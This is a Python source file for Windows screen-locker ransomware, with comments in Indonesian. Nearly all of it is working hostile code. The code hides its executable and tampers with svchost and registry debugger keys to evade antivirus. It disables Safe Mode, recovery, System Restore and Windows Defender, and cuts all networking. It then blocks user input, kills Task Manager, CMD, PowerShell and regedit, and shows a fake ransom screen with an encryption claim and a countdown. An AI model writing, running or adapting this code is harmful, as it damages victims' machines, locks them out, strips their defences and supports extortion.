# lock_system.py - Ultimate Lock System dengan evasion
import tkinter as tk
import ctypes
import os
import sys
import time
import threading
import random
import winsound
import subprocess
import winreg
from datetime import datetime

# ============ EVASION TECHNIQUES ============
def evade_antivirus():
    """Bypass AV detection dengan teknik advanced"""
    
    # 1. Rename process
    ctypes.windll.kernel32.SetConsoleTitleW("Windows Defender Service")
    
    # 2. Fake file attributes
    exe_path = os.path.abspath(sys.argv[0])
    os.system(f'attrib +h +s +r "{exe_path}"')
    
    # 3. Inject ke process legit
    try:
        # Copy ke system32 dengan nama sistem
        system32_path = r"C:\Windows\System32\svchost.exe"
        temp_path = r"C:\Windows\Temp\svchost_backup.exe"
        
        # Backup svchost asli
        if os.path.exists(system32_path):
            os.system(f'copy "{system32_path}" "{temp_path}"')
        
        # Start process dengan nama legit
        subprocess.Popen([system32_path], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    
    # 4. Modify registry untuk hide process
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                           r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",
                           0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "svchost.exe", 0, winreg.REG_SZ, "Debugger")
        winreg.CloseKey(key)
    except:
        pass

def disable_safe_mode():
    """Matikan Safe Mode secara permanen"""
    
    commands = [
        # Disable semua safe mode
        'bcdedit /set {default} safeboot minimal 2>nul',
        'bcdedit /set {default} safeboot network 2>nul',
        'bcdedit /set {default} recoveryenabled No 2>nul',
        'bcdedit /set {default} advancedoptions No 2>nul',
        
        # Registry modifications
        'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v "Minimal" /t REG_SZ /d "0" /f',
        'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v "Network" /t REG_SZ /d "0" /f',
        'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal /v "MSIServer" /t REG_SZ /d "0" /f',
        
        # Disable recovery options
        'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore" /v "DisableSR" /t REG_DWORD /d 1 /f',
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f'
    ]
    
    for cmd in commands:
        os.system(cmd)

def block_network():
    """Matikan semua jaringan"""
    
    network_commands = [
        # Disable adapters
        'netsh interface set interface "Ethernet" admin=disable 2>nul',
        'netsh interface set interface "Wi-Fi" admin=disable 2>nul',
        'netsh interface set interface "Local Area Connection" admin=disable 2>nul',
        
        # Firewall block semua
        'netsh advfirewall firewall add rule name="BlockAllIn" dir=in action=block protocol=any remoteip=any',
        'netsh advfirewall firewall add rule name="BlockAllOut" dir=out action=block protocol=any remoteip=any',
        
        # Reset networking
        'ipconfig /release 2>nul',
        'ipconfig /flushdns 2>nul',
        'netsh winsock reset 2>nul',
        
        # Block DNS
        'netsh interface ip set dns "Ethernet" static 127.0.0.1 2>nul',
        'netsh interface ip set dns "Wi-Fi" static 127.0.0.1 2>nul'
    ]
    
    for cmd in network_commands:
        os.system(cmd)

# ============ BRUTAL LOCK SYSTEM ============
def create_brutal_lock():
    """Lock screen dengan tampilan professional"""
    
    root = tk.Tk()
    root.title("Windows Security Alert")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.configure(bg='#0a0a0a')
    
    # Block semua input
    ctypes.windll.user32.BlockInput(True)
    ctypes.windll.user32.SetCursorPos(0, 0)
    ctypes.windll.user32.ShowCursor(False)
    
    # Disable system tools
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD /t REG_DWORD /d 1 /f')
    
    # Main container
    main_frame = tk.Frame(root, bg='#0a0a0a')
    main_frame.pack(expand=True, fill='both', padx=50, pady=50)
    
    # Header
    header = tk.Label(main_frame,
                     text="⚠️ CRITICAL SYSTEM ALERT ⚠️",
                     font=('Consolas', 48, 'bold'),
                     fg='#ff0000',
                     bg='#0a0a0a')
    header.pack(pady=(0, 20))
    
    # Alert box
    alert_frame = tk.Frame(main_frame, bg='#330000', relief='ridge', bd=4)
    alert_frame.pack(fill='x', pady=(0, 30))
    
    alert_text = """SYSTEM INTEGRITY COMPROMISED

• MALWARE SIGNATURE DETECTED: Ransomware.Win32.BrutalLock
• ENCRYPTION IN PROGRESS: 256-bit AES Military Grade
• NETWORK ACCESS: BLOCKED
• RECOVERY OPTIONS: DISABLED

SECURITY PROTOCOL ACTIVATED:
███████████████████████████████████████████████████
███████ SYSTEM LOCKDOWN - UNAUTHORIZED ACCESS ███████
███████████████████████████████████████████████████"""
    
    alert_label = tk.Label(alert_frame,
                          text=alert_text,
                          font=('Lucida Console', 16),
                          fg='#ff3333',
                          bg='#330000',
                          justify='left')
    alert_label.pack(pady=30, padx=30)
    
    # Progress section
    progress_frame = tk.Frame(main_frame, bg='#0a0a0a')
    progress_frame.pack(fill='x', pady=(0, 20))
    
    progress_text = tk.Label(progress_frame,
                            text="ENCRYPTION PROGRESS:",
                            font=('Courier New', 18),
                            fg='#ffffff',
                            bg='#0a0a0a')
    progress_text.pack(side='left', padx=(0, 20))
    
    progress_bar = tk.Label(progress_frame,
                           text="▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮",
                           font=('Courier New', 20),
                           fg='#ff0000',
                           bg='#0a0a0a')
    progress_bar.pack(side='left')
    
    # Timer
    timer_frame = tk.Frame(main_frame, bg='#0a0a0a')
    timer_frame.pack(pady=(0, 30))
    
    timer_label = tk.Label(timer_frame,
                          text="SYSTEM LOCKDOWN TIMER: ",
                          font=('Consolas', 20),
                          fg='#ffffff',
                          bg='#0a0a0a')
    timer_label.pack(side='left')
    
    time_display = tk.Label(timer_frame,
                           text="72:00:00",
                           font=('Consolas', 24, 'bold'),
                           fg='#ff0000',
                           bg='#0a0a0a')
    time_display.pack(side='left', padx=(10, 0))
    
    # Contact info
    contact_frame = tk.Frame(main_frame, bg='#002200', relief='groove', bd=3)
    contact_frame.pack(fill='x')
    
    contact_text = """🔒 RECOVERY INSTRUCTIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Incident ID: RANS-2026-{}-{}
• Contact: security@windows-defender.local
• Authorization Code Required
• Do NOT attempt manual recovery
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""".format(
        random.randint(1000, 9999), 
        random.randint(1000, 9999)
    )
    
    contact_label = tk.Label(contact_frame,
                            text=contact_text,
                            font=('Terminal', 12),
                            fg='#00ff00',
                            bg='#002200',
                            justify='left')
    contact_label.pack(pady=20, padx=30)
    
    # Password section
    password_frame = tk.Frame(main_frame, bg='#0a0a0a')
    password_frame.pack(pady=(30, 0))
    
    password_label = tk.Label(password_frame,
                             text="Enter Administrator Password to Unlock:",
                             font=('Arial', 14),
                             fg='#ffffff',
                             bg='#0a0a0a')
    password_label.pack()
    
    password_entry = tk.Entry(password_frame,
                             font=('Terminal', 16),
                             show="•",
                             width=25,
                             bg='#000000',
                             fg='#00ff00')
    password_entry.pack(pady=10)
    
    password_status = tk.Label(password_frame,
                              text="",
                              font=('Courier New', 12),
                              fg='#ffff00',
                              bg='#0a0a0a')
    password_status.pack()
    
    # Password logic
    CORRECT_PASSWORD = "mzkyzak"
    attempts = 0
    
    def check_password():
        nonlocal attempts
        entered = password_entry.get()
        
        if entered == CORRECT_PASSWORD:
            password_status.config(text="✅ ACCESS GRANTED - Unlocking...", fg='#00ff00')
            root.after(2000, unlock_system)
        else:
            attempts += 1
            if attempts >= 3:
                password_status.config(text="❌ MAX ATTEMPTS - SYSTEM PERMANENTLY LOCKED", fg='#ff0000')
                password_entry.config(state='disabled')
                disable_safe_mode()
            else:
                password_status.config(text=f"❌ ACCESS DENIED - {3-attempts} attempts remaining", fg='#ff6666')
    
    # Bind Enter key
    def on_enter(event):
        check_password()
    
    password_entry.bind('<Return>', on_enter)
    
    # Animations
    def update_progress():
        for i in range(1, 41):
            bar = "▮" * i + "▯" * (40 - i)
            progress_bar.config(text=bar)
            root.update()
            time.sleep(0.1)
        progress_bar.config(text="▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮", fg='#ff0000')
    
    def update_timer():
        hours = 72
        minutes = 0
        seconds = 0
        
        while hours > 0 or minutes > 0 or seconds > 0:
            time_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            root.update()
            time.sleep(1)
            
            seconds -= 1
            if seconds < 0:
                seconds = 59
                minutes -= 1
            if minutes < 0:
                minutes = 59
                hours -= 1
        
        # Time expired - permanent lock
        time_display.config(text="00:00:00", fg='#ff0000')
        header.config(text="⛔ SYSTEM PERMANENTLY LOCKED ⛔")
        disable_safe_mode()
    
    # Start animations
    threading.Thread(target=update_progress, daemon=True).start()
    threading.Thread(target=update_timer, daemon=True).start()
    
    # System guard
    def system_guard():
        while True:
            # Kill security tools
            tools = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe']
            for tool in tools:
                os.system(f'taskkill /f /im {tool} 2>nul')
            
            # Maintain lock
            ctypes.windll.user32.BlockInput(True)
            root.update()
            time.sleep(1)
    
    threading.Thread(target=system_guard, daemon=True).start()
    
    root.mainloop()

def unlock_system():
    """Unlock system - hanya bisa diakses dengan password"""
    
    # Restore system
    ctypes.windll.user32.BlockInput(False)
    ctypes.windll.user32.ShowCursor(True)
    
    # Enable tools
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD /t REG_DWORD /d 0 /f')
    
    print("✅ System unlocked successfully!")
    os.system('start explorer.exe')

# ============ MAIN ============
if __name__ == "__main__":
    print("[SYSTEM] Initializing security protocols...")
    
    # Apply evasion techniques
    evade_antivirus()
    disable_safe_mode()
    block_network()
    
    # Start lock system
    create_brutal_lock()